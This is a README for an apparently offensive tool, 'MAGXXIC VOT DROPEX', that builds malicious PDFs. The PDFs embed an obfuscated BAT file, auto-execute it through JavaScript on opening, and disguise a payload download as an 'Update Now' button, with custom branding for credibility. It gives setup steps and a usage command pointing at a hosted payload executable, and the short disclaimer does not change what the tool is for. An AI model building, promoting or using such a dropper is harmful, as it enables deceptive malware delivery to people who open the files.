# MAGXXIC VOT DROPEX

Advanced HTML to PDF Delivery System - Stealth Edition.

## Features

- **HTML to PDF Conversion**: Uses Playwright for high-fidelity rendering.
- **Embedded Payloads**: Automatically embeds an obfuscated BAT file into the PDF.
- **Auto-Execution**: Includes JavaScript to automatically launch the embedded payload upon opening.
- **URI Fallback**: The "Update Now" button in the PDF is linked directly to the payload URL as a fallback if auto-execution fails.
- **Stealth Obfuscation**: Multiple methods to obfuscate the BAT script:
    - Base64 Obfuscation
    - Variable Obfuscation
    - PowerShell Encoded Wrapper
- **Custom Branding**: Option to inject custom image pages for added credibility.

## Setup

1. **Install Python Dependencies**:
   ```bash
   pip install -r requirements.txt
   ```

2. **Install Playwright Browsers**:
   ```bash
   playwright install chromium
   ```

## Usage

Run the script interactively:
```bash
python magxxic_vot_dropex.py
```

Or provide arguments:
```bash
python magxxic_vot_dropex.py --payload_url "http://example.com/payload.exe" --html_template "template.html" --output_pdf "SecureUpdate.pdf" --crypt "PowerShell Encoded"
```

### Arguments

- `--payload_url`: The URL where your payload (exe) is hosted.
- `--html_template`: Path to the HTML file used as the PDF content. (Default: `template.html`)
- `--image_path`: Path to an optional image file to include as an extra page.
- `--output_pdf`: The name of the generated PDF file.
- `--crypt`: Obfuscation method for the BAT file (`None`, `Base64`, `Variable Obfuscation`, `PowerShell Encoded`).

## Template Customization

The HTML template should contain a placeholder `[[PAYLOAD_URL]]` where you want the link to the payload to be injected.

```html
<a href="[[PAYLOAD_URL]]" class="button">Update Now</a>
```

## Disclaimer

This tool is for educational and authorized security testing purposes only. The authors are not responsible for any misuse.
